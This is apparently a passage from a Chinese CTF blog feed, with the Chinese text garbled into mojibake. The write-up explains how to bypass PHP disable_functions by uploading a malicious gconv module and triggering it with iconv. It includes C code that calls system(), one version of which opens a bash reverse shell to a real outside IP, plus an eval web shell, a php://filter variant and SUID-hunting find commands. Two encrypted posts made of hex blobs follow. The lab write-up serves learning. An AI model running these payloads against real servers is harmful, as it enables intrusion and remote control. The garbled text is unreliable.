è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå¤§å†™ï¼‰&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå°å†™ï¼‰    2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åå†™.cæ–‡ä»¶  </p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"å¸Œæœ›æ‰§è¡Œçš„å‘½ä»¤"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>gccç¼–è¯‘æˆ.soæ–‡ä»¶,å¹¶ä¸”ä¹Ÿè¦ä¸Šä¼ åˆ°&#x2F;tmpç›®å½•ä¸‹</p><p><code>gcc æºä»£ç æ–‡ä»¶å.c -o è‡ªå®šä¹‰å­—ç¬¦é›†å.so -shared -fPIC</code>  </p><p>æœ€åä¹¦å†™phpçš„shell.phpï¼Œä¸Šä¼ åˆ°&#x2F;tmpç›®å½•ä¸‹è®¿é—®æ‰§è¡Œå³å¯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GCONV_PATH=/tmp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è‡ªå®šä¹‰å­—ç¬¦é›†å"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"UTF-8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"whatever"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="çœŸå®æ“ä½œ"><a href="#çœŸå®æ“ä½œ" class="headerlink" title="çœŸå®æ“ä½œ"></a>çœŸå®æ“ä½œ</h4><p>ä¾‹å¦‚æœ‰ä¸ªé¶åœºæºä»£ç å¦‚ä¸‹ï¼Œéœ€è¦bypass disable_functionï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆä½¿ç”¨èšå‰‘è¿æ¥ï¼Œå‘ç°æ²¡æœ‰æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦bypass  </p><p>ä¸Šä¼ gconv-modulesæ–‡ä»¶åˆ°&#x2F;tmpç›®å½•ä¸‹ï¼š  </p><pre class="line-numbers language-none"><code class="language-none">module  HACK&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;hack    2module  INTERNAL    HACK&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;hack    2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å†å†™hack.cæ–‡ä»¶ï¼Œä½¿ç”¨linuxç³»ç»Ÿæ‰§è¡Œç¼–è¯‘ä¸º.soæ–‡ä»¶ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/readflag > /tmp/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//åå¼¹shellå†™æ³•</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/175.178.47.228/8888 &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>gcc hack.c -o hack.so -shared -fPIC</code>  </p><p>ç”Ÿæˆçš„hack.soè¦ä¸Šä¼ åˆ°&#x2F;tmpç›®å½•ä¸‹</p><p>ç„¶åå†™shell.phpæ–‡ä»¶ï¼Œä¸Šä¼ åˆ°&#x2F;var&#x2F;www&#x2F;htmlç›®å½•ä¸‹ï¼š  </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GCONV_PATH=/tmp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hack"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"UTF-8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"whatever"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åè®¿é—®&#x2F;shell.phpè§¦å‘å‡½æ•°è°ƒç”¨å³å¯çœ‹åˆ°flagæ–‡ä»¶åœ¨&#x2F;tmpæ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆï¼</p><h3 id="æœ‰å…³äºphp-x2F-x2F-filterçš„å¦™ç”¨"><a href="#æœ‰å…³äºphp-x2F-x2F-filterçš„å¦™ç”¨" class="headerlink" title="æœ‰å…³äºphp:&#x2F;&#x2F;filterçš„å¦™ç”¨"></a><strong>æœ‰å…³äºphp:&#x2F;&#x2F;filterçš„å¦™ç”¨</strong></h3><p>ä½¿ç”¨filteråè®®ç¼–ç ä¸»åŠ¨å»è°ƒç”¨.soæ–‡ä»¶ï¼Œè¾¾åˆ°å‘½ä»¤æ³¨å…¥çš„ç›®çš„</p><p><code>a=putenv(&quot;GCONV_PATH=/tmp/&quot;);include(&#39;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#39;);</code></p><h3 id="å¯»æ‰¾æ‹¥æœ‰rootæƒé™çš„å‘½ä»¤æ‰§è¡Œ"><a href="#å¯»æ‰¾æ‹¥æœ‰rootæƒé™çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å¯»æ‰¾æ‹¥æœ‰rootæƒé™çš„å‘½ä»¤æ‰§è¡Œ"></a>å¯»æ‰¾æ‹¥æœ‰rootæƒé™çš„å‘½ä»¤æ‰§è¡Œ</h3><p><a href="https://blog.gtwang.org/linux/unix-linux-find-command-examples/">æœ‰å…³findæŒ‡ä»¤å‚æ•°çš„å­¦ä¹ </a></p><p><a href="http://www.51gjie.com/linux/1015.html">ls -læŒ‡ä»¤è¯¦è§£</a></p><pre class="line-numbers language-none"><code class="language-none">-user         &#x2F;&#x2F;æ ¹æ®å±ä¸»æ¥æŸ¥æ‰¾æ–‡ä»¶find . -type f &#x2F;&#x2F;å°†å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶åˆ—å‡º&#x2F;dev&#x2F;nullæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è®¾å¤‡æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ¥æ”¶åˆ°ä»»ä½•æ•°æ®éƒ½ä¼šè¢«ä¸¢å¼ƒã€‚å› æ­¤ï¼Œnullè¿™ä¸ªè®¾å¤‡é€šå¸¸ä¹Ÿè¢«ç§°ä¸ºä½æ¡¶ï¼ˆbit bucketï¼‰æˆ–é»‘æ´ã€‚æ‰€ä»¥ï¼Œ2&gt;&#x2F;dev&#x2F;nullçš„æ„æ€å°±æ˜¯å°†æ ‡å‡†é”™è¯¯stderråˆ æ‰ã€‚find . -perm 664 ä¾¿æ˜¯åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹æŸ¥æ‰¾ ownerï¼Œgroupæœ‰è¯»å†™æƒé™ï¼Œè€Œå…¶ä»–ç”¨æˆ·åªæœ‰è¯»ä¸èƒ½å†™çš„æ–‡ä»¶ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€æ˜ŸæœŸæ°´é“œ</title>
      <link href="/2022/03/30/yi-xing-qi-shui-tong/"/>
      <url>/2022/03/30/yi-xing-qi-shui-tong/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰ï¼Œè¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹ï¼Œè¯·å†è¯•è¯•ã€‚" data-whm="æŠ±æ­‰ï¼Œè¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«çº æ­£ï¼Œä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹ã€‚">  <script id="hbeData" type="hbeData" data-hmacdigest="d07a36dcf047153f01a8f406a2372648cdd644c674fcc735252a8d022111f96e">2cf9f0e39f26ddd937cd5eb31197d2f7452e35fa3efd28f8064b690826064841860dc90b0ea8c0ba6cbd42298ac781e59e7051af512eb8ae324cf1d4c26087742a2a20035ce7f29a2f492152b74db6a7746399a1d926406362762ff6725ce76f88e836f0f318d24c045eca9b71cd243a7998ab3bf4135c5f1e4265f04cda2df0ef2ce4b0ffef482ec55098aac38cd152757c300938bbb076a74682c5b26b1049ab249be8a7a0b330823ab99ca39726b0da0eb18048609a95374d79d470936b8afddc3a9041b389eefb36e6a9ae5340cb04fa9bb5c16a649b64c41f7de25cd283e8cb0f83cfdf00d6f6bcdded2813a932e2a01394ce7adfb19ca9a0f2b60329485024c8a37cc089416ba578b6093d46d94925d27171855e7ec652c1e80d9c543f8051b17a908efd3c190a157ff99f35adb5bdbfa591b23cbeefddf7da18bef7c75ce17dbab19e9ffc2f76d54a81c745424fab33b9d9542a1e68c7cc89b3f37be326548b688ced1daad6f56cf167602e253688e730aa0ad86dc52f5f380364f78011cb6c5fea011be24ee9458c1621f87f4fe9abe8d897a434042e4fa78a761d4734bd277e303d7333f0ffabc2d39dc72ce3e23a96d1a2a3f4f7a6aa03c3cacaad83d2e6f22ddfa83262eff8a9a7ceb827c8577f51a021a3884363436f85f1fb5265f8a63a6a4f049a53abddb9fa3b2340d3156d2129188898f661861d630a6a8802ce2916d74770c2cce62f34ecbca803c81d8ba3ed23e0df83d73cbd777a37684289f09690f23a8fc148a310f0af4421e6c65bdf31c85b5b73409b55dea9464b2b01c89cd91ceae60f0f6bd1d2831a5e4157c3a88df17ddd5fe2dff74d3d8f1b329e79eb0a035016e8e5b3aeef317d983ee7dc2cfa1a35cc15615c4118be3c363f7d67a29d2a7b2d32dfccbac2d89be87d78fa7758d3ea47071c2d7c39636efa69d5296eabcb979a32a550df18f67e439eb433a1d3a107628bde2f60958075a218f85155881a5351f10c08d79565481bc1e3758c879d25d1025d74c3a4ce00c8cbc018eb58887b04c5bdca7e1753de9cc979709760b3356215c4b52db206d9e6e842313758d856884b8574101149ce3e283894e61efa75e7f72368e1d04538dfb1749cbc6ef51907efd0c1bf210d1b03b0d0134dc03b04bb0abc7d1b290b2b9e9208835c46eaa5edd0d2a8521634327e43dd7263e1b84ab7059b5324ea0f3ef49087e0dbb13e9cd347b2e74a9601023e94d125c6b5468c8ebc955b5bef056e6ee81ada918d28aa9f3c6c9f005412b7420bf3e30ccdc765e5d40476b0ac29f8639407673c348ee4b9590b19fb146af41dad3dc713f1c187431a826eb1589518b151a0d9117cb95a9761afe1b9b4f24d885a00682f68fb83a6f47b0d3b88f7c6188bd7f67545e10b80f42ea5c01d4089c9a5280ed2a871c8e05ac2e83ff16663134b9ca91d67a3aa61f60a1e4d7bcd127f4d667cbb9a6a37dfbff87972997ad492cd6aadc8cc86db8e2bbd3373b81d550c642a2e614f6a6a623adc2d0240ec479fd4a42e78abad4b2d91d53b1d58f7982693e26e8445279041ba5f47626f20a185b28004531adb82efc5c6ef1eb788ac9d53b1761b3cdb6b6df2158fe32a359e3823c66ab26abf9dfdc2ba794ac1fcc859cf7d6e0a610470fced0d8bcef27a7250835e319c3aedfc3b536e28ada425f73832f8a576301a4211fb7f28ddcb265002343781492a941976b388f1df0c3d3f2e5a553a3aeaea44373b87efaf7f87744780a262e5bd94add8ae1d19626f305858507f2c24b18578d9565a6b3f7fff1e5dc288cfb4c67b204ec5b59e4d6d8fc3ae313d183c656cdaf797f9b4ca8a402bf218b770f3cd17d4e9f5700634bb21af453d566f7fb1cd46604256df00738b01dfed35b718512c5ba51bf95bce2bb398d65981e487ae459a4dcfa0e50d1870898929ef9d446a025cdf5bc66ad19e42ca08a9d4537a42a49aa51e32724a7e280a5a5003047433aa574a0e2f53058541eff327dd8476515205b33cd2ea42123649bda54406cd83436a6036f90ef9076448666c7032795cd362adfd36c440b317eb84b4c00e1a76098379f8936e1693bbcfd50331b593863d634d8232298fafbac440e08a0bffcb1eb3f780815b6d1931183ccac9e83714bd30ef5633817f306bb8f295be133608935e0d4a20822a35e7e7f6aa4d608ac32f3f888ced8659be4b599e11ce52604830599ef5d81cc353424164feb89db03bb936c0c3f51a90a4f734bdbfa4dc51b900f6650e894251f1aa8963598ce1bbf916161f1a0e2e0262cc71834c6eeb4bfabb37a464f64ced352f7ecf639c6ec3b1331782073c4d2b5994041c0eacdd60dd44408c6df1b15d8492876cac212a34b7f78d05f754b922bc860f3906e12895000ea610d88c67d6d77ef97bfe2cb6d11a5332bb551307fe9bfb736e24929885dffc945672ed8bb04df4615d49fdcbba58c330c976ff67f6fbfb227cff649eb52c648443fccb5e859955aa0c3b5ea0605208f33f77931040708bab7c309404967ba800215bce81488990502456b1637f5c60d698e9273d9c0a379416d6d2155af9e95f8122cdf851fdd6cd274e14b57181127e6b7a3e91c18c89d03f81ed07231a12da66a0eac835ab3fefe5ed95bbabb64a00da69b62407654b5a9335c7a50ab722ee14513a18329587813e23511428ef4b60c487e0c64c4d87cc34cf47d65ca2403f9d0809e7b61fcd727b61004d68f115382f3b723d5381c002614a3fc6e8f10861621e36575b4dbb27a0ebbc6afefeaa05d97d4bf9bb9baf7c1b6dff57f9f1e37c7abed64f4354798bb32f6bbf2f912de44a439375d8b4dbe142015562080bd096cf7d1c2f7e5457a82fb5b731f674c3fc6defec3ae6e97a46cc6d6f1e61c149544e9af4eaac047422a6b4bdf912e02695750bb8558afa43a13c1fd43bbc2e6cbeb068b4f8f4f7c280f417eb1ba4f9c59c73a8b282df0f98b97cca1bf3507ff92c863850faf48361075f0db0cbf984f16432b4aa073bc3c8006c023eeda38c7b768f7750e94b107e70f8ae8aa59fcac230a38209649499bac22d1cbf2ef4fd02482de1a3e1913a102dc0c92a77c51be8efc9ca194ad0637522e85e75b3fdd9fad42606b4539c399edd10726d58e1337a45f648d70bc4ffafb3004e1ddc9488b8143e100de75f8cb39f964a0ef03386685a99b5c4cc258ca45555540eb2110e348418af9ccf82ada91dbb6ff96752cf7b1e822555b3f46555b96263e8efd391d305fb1bb41768769ee8f9b13d8d9a3c20e52c126db56333d569261ae2821c49bc3b9deb9aa41f92100cdf329de5d99c7d096594cf1d787fbe696b74d6b1c747031b3e1f294d9c2f2e0500</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ‚¨å¥½ï¼Œè¿™é‡Œéœ€è¦å¯†ç ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> é—²è¨€ç¢è¯­ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³•ä¸ç¨‹åºè®¾è®¡ </tag>
            
            <tag> æ¯”èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºå‹¤å·¥ä¿­å­¦é‚£äº›äº‹</title>
      <link href="/2022/03/24/guan-yu-qin-gong-jian-xue-na-xie-shi/"/>
      <url>/2022/03/24/guan-yu-qin-gong-jian-xue-na-xie-shi/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰ï¼Œè¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹ï¼Œè¯·å†è¯•è¯•ã€‚" data-whm="æŠ±æ­‰ï¼Œè¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«çº æ­£ï¼Œä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹ã€‚">  <script id="hbeData" type="hbeData" data-hmacdigest="e10dd18f7ef24532e9b10ce9d5acf2023881695e7d5517386b1aef5017b62632">2cf9f0e39f26ddd937cd5eb31197d2f7452e35fa3efd28f8064b6908260648415f4b48f8be62c37589ab75ea4d90e1e905957319865eef32954bf75359f48bedf9c3317142d1169eac50837320441bd0204f059400a1f5e3ab8998a23d2fe0685061d299e8d0371fbf77baf27794bdcf624ce85447d86008f26ed5f5d74ab686167de8164bf0a544b13fdab90ef16442062cec3e011bec0005e4844db095231177313a35584b1324465136e7e5431a8488d1f0833d881981a9d9013e2bdec2345694c0e9690b537371ec76c4838e454babab52c19f893373db8638af75da0b9242648c84a06a2caf2be235cf37a024f9329b7cfe8d226b4773da2e8e40313db34b12bdfadc28f4a82506e2a8048aa46a6e61cb4fc9e4742e2c02a615defbce3de6c604c727de3e870a67a0bbcd6c40a8461c19599c11e6c5937b5d7620cfc50bf540e373d7a998f6b3affe19e186198aeb67946ceeb931bc09cb30de817dc3537cbff47f7fb0184a989517582c89f63e648b65f92f629ebfc642a9bd570c254360bad4db0a999d5f17f7ed46ab8fa449ccb50edfb040bf17cc569c05f3dc7362d93d1c82518db12780e87f407e223010ad56a4ae9ca6950610db5b125988479896316c1ad6b65c8922c37c9049d9e30d5ee845e9226627a3a3b01ab0fe76dfbc32d1cd29fc6875af0fef6114ff1cbd1cddbd7379540d3da8abd2d42c4d1e98002cf850447e9a90b733466d54d52c0a4eb05b582609e68591cd0dcd999c65bcb7035635aceeecde6780a19e59612028ebc88caa0ac2df95439a6370338d7aef81ddaca337a0f5513518673c99ca5d1a9a429170c3338496e605016d2bc45529473af037a1ee608b168e3ce80482a513fef56b8077dca844198a40a78f7c665e48264464d138593973712fc410d1139b4c87c1c8f3d1b419f9b296899659d065f3844747feb5b397d45ecddeef479139cf3cbaaaaf172826f6e5b2257751c896abf96f0802425d21613632929538f43df8c8d1322f6530f7264547819054e44ea60d756c3f0b620d8a3a5dd0d84062d06dade660671a10995b95930bac327d990291ca1c613584bc2030bdfb412b7ff1d1ef8f79c9310dbc2c17a42bd84db1848635bd592bc5877f04994a0f18469055e9310618787abc9c2dcffee91dd4b6e788657999efc7c91396d2a5b480d88aaa21a0223c31fa9546534f01f8e1dfb8eb5f9e4ecd09e02458cdbee4147d62ba0f45f82c95370e270120bfb298a926930ca97f5f3824071a0b3dbd965b6eb199b56e1a3988cc801059f6968d406ce48a59061426fc635e36edf5806f04fc2b2cb5408616affb9b3bca8e842d6adb42c4eb1c185cfeb797c5c212000ec1a079bc8e21468e9dead857360bcb4259a1e4daaca90cb36ddbeb0fd9d1b49d03f78015a16f21020df61a7972afb6192288255add701d480a74801bf108958236f59d0037229c5b50fcd19961aeca1b036209686479cdb5db36cd84701695056889b14429d27cec0140df948e8b585cf0e839548b8cc4b1871270d9f7a34433eab45d3152d01622284d9b4918a974444d26313cd40ff0afe9b35c43d78f5e93d1fd9d2dabf3d220550753fd634147bd6a57a243944c411026753b19b28e94d303f6ed4414e4480e4213b731c927e856035faf2766116f0e2fad5d2cca9207ddac12e8abb08954689853e19d2d97470416ec9268ef1de144a5a1b8d74bf9e7fe5cc97bd0aaa87c07451ed409897b37e5b71fe8b13247c684ab349b0cb4f5258c38eae10d8c3f3e99154f72c09e238c69dfac23adbc822e2f7c4ff62432516e01d77cf6652f16a6be78c7c51f100b7521d05b01d385ff5d1a9d9c1e63ae3f58bf528b6c798d68d0c923dcd52ba8c1216015e1284301498eff127fa1c8d3dc4d9bdd9ed4d945f9b80d42e6ccfe593e0741a153b49d0ed76552ca7e959af556bb5e0bf53c76ad8e9efc42271943ddee3f072d298240582a263a1e738f0be7cc76c6ae0566f069b7e89d0285ea4a538f1e48e86bc77a915f08b27b592e717c1ae822c27d5f177922f286c892313210bb1302be2e74db7f31e8ce2a340363a3abaa4c023b5f62e3cd3aa7807cc88ce3253ac3077a25b03840aae1cd6a180b8f1e6b27e24551101fa852f37e617cc1b657ee714a9a18704e1966ff1cd1ebc7db1ed8199bc447bd03757f288e7e59870fe954952e9747d1ed9337621a02fdbdc178e28ea2020feb60ee0d050eadf891e92667706c6b6a4b387088b09086ff03906234d5bfca08158193ab1161ade5f370d09b68e2eaa459394448326f07695f44b9c82ef74a1cf396c8c636003c33c0fd6d1bbd49454fd2ce02bde018675f48e04a5b9948f328f43882cf234c01b4796117b2cf9a4b87ed2c8918c31d699c00965abd847b986b6567d10b7853ef1453c0ffb458e209c3a663c6c319dc5fe18558c681975362c6d648f2f5c4c8aba1ed4a0ce4cbc247deecedaa63bc5e86bdcdbf2caddd6e7a770c51b46b9c63f3cad81b3389df4831de4d8ab2edee77d06443837f8d81049b55bbc2cfc82cab22ab240319520b23bf2ebae19e13d4ff052a277a521c9dd34d9f3fcdf6cb773ec2ef2ce46f07be48b0948aaa49d9fd7fb5ad44a8e5d99e52ac9bbb527dfe5ae9a6d5b73cc4e8f65ee634531bf7da1ec814a54469eebac11ba9aa6d1ce1da86dcd9a44fa1c36587ba8720e8c52db6405de15902f16bc0d8f40e7e8b0bab139a1afbcc2afcb7c2f3e1bf42c9e3a8acfac0f6801791d40cd926b3c037b21a1988bc6f3391c2e66c9f91dad6c78b1259dfb906d14aa87fa027b72680f3fdf790ab40db6dbc5f51493136999fe5ac5a9125803749007b152166f9b96f6cf37d166f7823cb07aeb59ba3b58291b817352f4f2883d237d11caf84f54fb35e4e8aca1ec3e47ecca82ead85bf09ee4e4c31b7de5031a72410e7606025091cd2c4beac1a59233b665d9b5953ccaa57c85ead9a20e1cf1112455864ae6bb637f1159d1072d29d650cf89494aaa32cac4e2ec411e64866f28f63f3d4746c3ebb0d2abbd43c8dd35629030fa32cc9db19be99a73cbbbb9d08859852c1c6c86f69e34ac0178f052f005bfecedb2bd98f5f74b3b4cb75a0e4c7cbd93daddd9ded0627647444f75d6202f2db8091c9bb8fc103addb70469218b8b2ce14f02d527e6f97805958e7a0f62184c727b20d6ce8d7dac399f19fa092e898ededfbca557adc909037a4c592ae4ba0f234b09c33983256a8d341dd59d1e68a2af525d6633b5142376cd7fb146fe0823c95ee84588950a0d3c552334df77a2a5db6656df64a7b43e7a0b960286384a53d5744ff7d586ef1d56c56f0e662a446708cd93fd55595c200c201e832e47dde20eb5ba3f39ce816bbe30f38f59d631da47fc564c250701cafbaca73bcd42ed82f530179252aa2bc0dabf26371730921bc874512adf14a0bc9553a4eb9b3674deb4cfac6587a47f19b6c56b5afb06e224d8c10001979b97ef3a993f7e63f63725d72d318377d3466d916a2bf82048b87d22f0f180026f399242c42b370b7e57a33f154bfddba5cf97ffd09f407f238c6c03d2347f6687eb69382b7a1781be18dab05205acd8f9e41ab4ec8ff8069ca803c70960cc38c2a7a06e2e52156fb0f20b2d3238e89c4210a7bb5072a3a0069b25b646bfb3a74438579d8da5ef2cbb98daa7147112ad4969331c07c05274521b5fff87e79e75ae4731a39148a0ef076b988e5764e1b571d9f97c0850df65d2ae3a7f5ce0671113c56a88722aadd92299943802955ee33cbb06e8280bc68e1cf9d165307262f1906734e9afdd80869676646870dbcc89bb5c53ac0218d432f709a282b53edb7194bb9ab97e509f4a2f1861aac108bd554309669bfbed8c85f406ea60ba93dd59b2974294a92fbd21f17ea8cf06030696b902937daeaf4d2a337be966e31bf1db2c05ff6cdb254e98d4aea464365d09d650e763bba7ab81d29ca754473f63b49a097350c33b2c252749e700cb3dd2ec18843e4ccd9c7775b411cc1ae88b99419f2b7e699c3e71eedbbc3bae09d55863fea5da57f2b3211e052556f783d84c297e7b2ac9c6f9a01fac37aad20c51a520efa3b9246450a632e9022251fa320a4a7cd9139af0b4f5292503295976747ed5b87c366f9ed55867af64f911d9dd9cef9c9c5ee493ccf1979f9ff58be064e0ab82505a4b360e918911881120e8c5ef46f9e95723ab42ec6cf4dbf8913f9f9999a43689b4c3a4d9c1ce303d2267f91fd6653e63b2bb7e1ffebe7232c043589bd0eb77bcf7c26c6cc149e5c0f1277228421d050c9e5d5e3e1843c124d52c7ff8b41d88f12b5c8ad2b3dbd38137c3ca1ff8b0922b738716d500c0ba1b767584f6188eb4b8358b58ee2ee11f5865484eed62573bc719e7206a1dcb53778aeda87fd75ae14b6ccad7e65936377ed161c5647e85b16263a3a9335dc68c6469efee7a7f15a2e8304281daaab989b65c09c3767b95a108b9084ec49219cb31a8dbcb1862c910e2b30edb3c51c2eb676c077d4fd5cfa023a2a3cecc89350eb9dcd8ade7997cb2fd148a9867ba24fb319f0fe2b22b51a67f5a1f39fcfae5735b01b46079d568929e52e4d836fcbb36010e401d34e3924795e41a448fe681a0ab870c848ef13c068c3c41006015fbe295ecb0739928d21a31eae996f050405393f14698c2d8fa1b19647cc53126f62f1a00dd181003428670711d4e81ce3ae8dcb498592fd1a3828669f8c5a3a78023d91567f09590778abc356e94b297e212c43de0eda43107f4514d6ccaed168d9032e7a07b2e57d35114450d561edc5b8852d3f3dcdbd3a30c7127adec7e3d5594d3d1ca10d1563b4ca53a7bf16c9b515e1bc304cec51c88cc187eb57c923c1c8a0718828bae40d236f9f25ae21bc2763b4f5eeed2230e8ba11d502dd66cfa84be1c72f36ed5abcd7c7f6d3369e911be0368bcf68db7f15c9247dd81bc4132f6a64aec1c1d676426ea1a4491069e42e2580328a3ca743bd1626c58c0847e5bfbbe61ac63cd2cf1eff9dce05564e173d3ae26b03297eedd97065211b34673ba899b78074c5dba18103bc44108d9b8b740e5aa89260dd9464873f1223d63735b25f6c576117d62a9c607772037cc64c7764e44ca29c3395a61e4b7943905063fea16b53f6c468f2883de18c283a268dd53d23ebb71dd9494026c3b0a4ab8490da91bab374a35151fa464577c6de776fa95d8230c79dc231190d66ca9a9778c54ebb6bc5f0ba6a092ad454e02d74f13ca18ef070706008db1ce1eebfdd4c4101f8c66db20030dee3813cb9a9cdce62220db536e78acbd3774fb179e89b13cda40d64546705b49bbfaaac621953b4d401e89c6961acc6d9d2926018e377f393d105be23905cc71c6920d27fe69d1ebcb0713b740c11271be0a7a4985c1291d93e2f64b48daac03e06fcea357c0b29d4926f7aa46feb1e6e7b5bf406c85d5d5b2eac28977d858fdd4366e1735bd018c53853548786d7fa13cda04ebfbe5fca947fd18eebec7def2c282ff21b18267c839bf77002621f6a4e07017f5fed36665bf052dc47c99d9568ee78bcfddd6ac05d5acae4c500e71330aff30d54dd907c1e317b61205843b3fc7125d273772d813bf44d2942f90779973fccb5bd1c1776af3bbc5b6e4c69555016e